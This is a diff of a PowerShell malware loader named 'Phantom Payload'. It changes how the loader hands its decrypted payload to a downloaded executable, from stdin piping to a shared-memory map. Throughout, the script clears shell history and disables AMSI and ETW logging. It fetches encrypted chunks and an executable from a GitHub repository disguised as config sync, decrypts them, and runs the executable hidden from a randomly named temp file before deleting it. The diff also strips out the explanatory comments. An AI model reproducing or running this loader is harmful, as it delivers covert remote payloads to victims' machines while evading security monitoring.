@@ -1,14 +1,12 @@
-#  <~ Phantom Payload loader (A2 â€” stdin-piped exe). ~>
+#  <~ Phantom Payload loader (A3 â€” shared memory). ~>
 $ErrorActionPreference = 'SilentlyContinue'
 
-# -- 1. Clear PSReadLine history --
 try {
     Set-PSReadLineOption -HistorySaveStyle SaveNothing
     $hp = (Get-PSReadLineOption).HistorySavePath
     if ($hp -and (Test-Path $hp)) { Clear-Content $hp -Force }
 } catch {}
 
-# -- 2. AMSI bypass --
 try {
     $am = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
     if ($am) {
@@ -17,7 +15,6 @@ try {
     }
 } catch {}
 
-# -- 3. ETW bypass --
 try {
     $et = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
     if ($et) {
@@ -30,7 +27,6 @@ try {
     }
 } catch {}
 
-# -- 4. Config --
 $BaseUrl    = 'https://raw.githubusercontent.com/negadofoxzz-art/cfg-sync/refs/heads/main/'
 $ChunkCount = 10
 $KeyHex     = '6db02580be9a4fdfa1bd8da241b41f03b2cd2e36edf5ebef2feedeabb02a843c'
@@ -45,7 +41,6 @@ function HexBytes([string]$h) {
     return ,$r
 }
 
-# -- 5. Fetch chunks + mac + sl.exe --
 $wc = New-Object System.Net.WebClient
 $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
 $envParts = @()
@@ -70,13 +65,11 @@ $slB64  = $wc.DownloadString($SlUrl)
 $slExe  = [Convert]::FromBase64String($slB64.Trim())
 $wc.Dispose()
 
-# -- 6. Split envelope --
 $iv = New-Object byte[] 16
 $ct = New-Object byte[] ($envelope.Length - 16)
 [Buffer]::BlockCopy($envelope, 0,  $iv, 0, 16)
 [Buffer]::BlockCopy($envelope, 16, $ct, 0, $ct.Length)
 
-# -- 7. HMAC verify --
 $key = HexBytes $KeyHex
 $hm  = [System.Security.Cryptography.HMACSHA256]::new($key)
 $macCur = $hm.ComputeHash($ct)
@@ -90,7 +83,6 @@ else {
 }
 if (-not $ok) { Write-Host 'hmac fail'; return }
 
-# -- 8. AES-256-CBC decrypt --
 $aes = [System.Security.Cryptography.Aes]::Create()
 $aes.KeySize = 256
 $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
@@ -109,17 +101,22 @@ $cs.Dispose(); $ms.Dispose(); $dec.Dispose(); $aes.Dispose()
 [Array]::Clear($iv,  0, $iv.Length)
 $envelope = $null; $envParts = $null
 
-# -- 9. Write sl.exe to temp with random name --
 $ext  = ([IO.Path]::GetRandomFileName()) -replace '\..*$',''
 $exePath = [IO.Path]::Combine([IO.Path]::GetTempPath(), "ms$ext.exe")
 [IO.File]::WriteAllBytes($exePath, $slExe)
 [Array]::Clear($slExe, 0, $slExe.Length)
 
-# -- 10. Spawn exe with Fivem bytes piped to stdin, hidden, no window --
+$mapName = "Local\PH_$([Guid]::NewGuid().ToString('N'))"
+$mmf = [System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateNew($mapName, $fivem.Length)
+$view = $mmf.CreateViewAccessor(0, $fivem.Length, [System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::Write)
+$view.WriteArray(0, $fivem, 0, $fivem.Length)
+$view.Flush()
+$view.Dispose()
+
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName               = $exePath
+$psi.Arguments              = "`"$mapName`" $($fivem.Length)"
 $psi.UseShellExecute        = $false
-$psi.RedirectStandardInput  = $true
 $psi.RedirectStandardOutput = $true
 $psi.RedirectStandardError  = $true
 $psi.CreateNoWindow         = $true
@@ -127,9 +124,6 @@ $psi.WindowStyle            = [System.Diagnostics.ProcessWindowStyle]::Hidden
 
 try {
     $p = [System.Diagnostics.Process]::Start($psi)
-    $p.StandardInput.BaseStream.Write($fivem, 0, $fivem.Length)
-    $p.StandardInput.BaseStream.Flush()
-    $p.StandardInput.Close()
     $stderrAll = $p.StandardError.ReadToEnd()
     $stdoutAll = $p.StandardOutput.ReadToEnd()
     [void]$p.WaitForExit(15000)
@@ -144,7 +138,6 @@ try {
 }
 
 [Array]::Clear($fivem, 0, $fivem.Length)
-
-# -- 11. Delete temp exe (sl.exe also attempts self-delete) --
+$mmf.Dispose()
 Start-Sleep -Milliseconds 500
 Remove-Item $exePath -Force -EA Ignore
